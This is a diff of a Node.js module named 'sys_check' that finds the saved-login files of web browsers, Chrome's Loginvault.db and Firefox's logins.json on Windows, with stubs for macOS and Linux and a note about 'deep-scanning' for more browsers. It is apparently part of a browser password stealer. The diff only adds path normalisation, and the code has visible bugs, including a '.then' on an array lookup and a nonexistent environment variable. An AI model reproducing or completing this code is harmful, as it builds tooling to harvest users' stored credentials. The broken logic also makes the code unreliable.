@@ -1,5 +1,6 @@
 const local = process.env.LOCALAPPDATA,
 	roaming = process.env.ROAMINGAPPDATA,
+
 	fs = require('fs'),
 		p = require('path'),
 	chrome_win = p.join(
@@ -19,14 +20,14 @@ const local = process.env.LOCALAPPDATA,
 
 module.exports = class sys_check {
 	constructor() {
-		for (const folder of pass_path_win_2) {
+		for (const folder of p.normalize(fire_win)) {
 		module.exports = f = (() => {
 			fs.readdirSync(folder);
 		});
 		}
 		this.win32_validBrowsers = [
-			[/chrome/, `${chrome_win}/Loginvault.db`],
-			[/firefox/, `${fire_win}/${f[0]}/logins.json`],
+			[/chrome/, `${p.normalize(chrome_win)}/Loginvault.db`],
+			[/firefox/, `${p.normalize(fire_win)}/${f[0]}/logins.json`],
 			[/internet explorer/, "internetExplorer path"],
 			[/edge/, "edge path" ],
 			[/etc/, "NOTE: Find a way to deep-scan for other browsers"]
@@ -54,10 +55,10 @@ module.exports = class sys_check {
 		const foundBrowser = this.win32_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser)).then(console.log);
 		if(!foundBrowser)
 			throw Error("Invalid Browser Input");
-		if(!fs.existsSync(foundBrowser[1]))
+		if(!fs.existsSync(p.normalize(foundBrowser[1])))
 			throw Error("Browser Not Found >:3");
-		if (!!fs.existsSync(foundBrowser[1]))
-			return foundBrowser[1];
+		if (!!fs.existsSync(p.normalize(foundBrowser[1])))
+			return p.normalize(foundBrowser[1]);
 	};
 
 	static async macOS(browser) {
@@ -65,7 +66,7 @@ module.exports = class sys_check {
 		const foundBrowser = this.macOS_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser));
 		if(!foundBrowser)
 			throw Error("Invalid Browser Input");
-		if(!fs.existsSync(foundBrowser[1]))
+		if(!fs.existsSync(p.normalize(foundBrowser[1])))
 			throw Error("Browser Not Found >:3");
 	}
 
@@ -74,7 +75,7 @@ module.exports = class sys_check {
 		const foundBrowser = this.linux_validBrowsers.find(v => new RegExp(v[0], 'i').test(browser));
 		if(!foundBrowser)
 			throw Error("Invalid Browser Input");
-		if(!fs.existsSync(foundBrowser[1]))
+		if(!fs.existsSync(p.normalize(foundBrowser[1])))
 			throw Error("Browser Not Found >:3");
 	}
 }
